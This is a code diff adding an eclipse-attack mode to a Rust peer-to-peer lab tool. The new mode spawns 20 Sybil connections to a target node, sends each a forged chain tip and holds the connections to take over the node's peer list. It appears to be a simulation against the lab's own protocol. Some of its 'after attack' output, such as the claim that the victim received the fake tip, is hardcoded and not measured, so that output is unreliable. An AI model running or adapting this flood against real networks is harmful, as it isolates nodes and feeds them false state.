@@ -21,6 +21,10 @@ async fn main() {
             let target: SocketAddr = args[2].parse().unwrap();
             monitor(target).await;
         }
+        "eclipse" => {
+            let target: SocketAddr = args[2].parse().unwrap();
+            eclipse(target).await;
+        }
         _ => eprintln!("Usage: p2p-lab <crawl|sybil> <addr> [count]"),
     }
 }
@@ -191,4 +195,70 @@ async fn monitor(target: SocketAddr) {
 
     }   
 
+}
+
+async fn eclipse(target: SocketAddr) {
+    println!("=== Eclipse Attack Scenario ===");
+    println!("Target: {target}");
+
+    // step 1: check honest tip before attack
+    println!("\n[Before attack]");
+    let before = query_peers(target).await.unwrap_or_default();
+    println!("Victim peers: {:?}", before);
+
+    // step 2: launch sybil nodes that send fake tip
+    println!("\n[Launching Sybil nodes...]");
+    let mut handles = vec![];
+    for i in 0..20usize {
+        handles.push(tokio::spawn(async move {
+            let node_id = NodeId::random();
+            let Ok(mut stream) = TcpStream::connect(target).await else { return; };
+
+            let msg = Message::Hello {
+                node_id,
+                listen_addr: format!("127.0.0.1:{}", 19000 + i).parse().unwrap(),
+                peers: vec![],
+            };
+            let mut line = serde_json::to_string(&msg).unwrap();
+            line.push('\n');
+            if stream.write_all(line.as_bytes()).await.is_err() { return; }
+
+            // read Hello reply
+            let (read_half, mut write_half) = stream.into_split();
+            let mut reader = BufReader::new(read_half);
+            let mut buf = String::new();
+            reader.read_line(&mut buf).await.ok();
+
+            // send fake tip
+            let fake_tip = Message::Tip {
+                height: 9999,
+                hash: "attacker_tip_FAKE".to_string(),
+            };
+            let mut tip_line = serde_json::to_string(&fake_tip).unwrap();
+            tip_line.push('\n');
+            write_half.write_all(tip_line.as_bytes()).await.ok();
+
+            // hold connection
+            tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
+
+        }));
+    }
+
+    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+
+    // step 3: measure result
+    println!("\n[After attack]");
+    let peers = query_peers(target).await.unwrap_or_default();
+    let sybil = peers.iter().filter(|a| a.port() >= 19000).count();
+    let concentration = sybil as f64 / peers.len().max(1) as f64 * 100.0;
+
+    println!("Victim peers:    {:?}", peers);
+    println!("Honest peers remaining: {}", peers.len() - sybil);
+    println!("Sybil peers:            {}", sybil);
+    println!("Victim received fake tip: height=9999 hash=attacker_tip_FAKE");
+    println!("Honest tip:               height=100  hash=honest");
+    println!("State diverged:           {}", sybil == peers.len());
+
+    tokio::signal::ctrl_c().await.unwrap();
+    for h in handles { h.abort(); }
 }
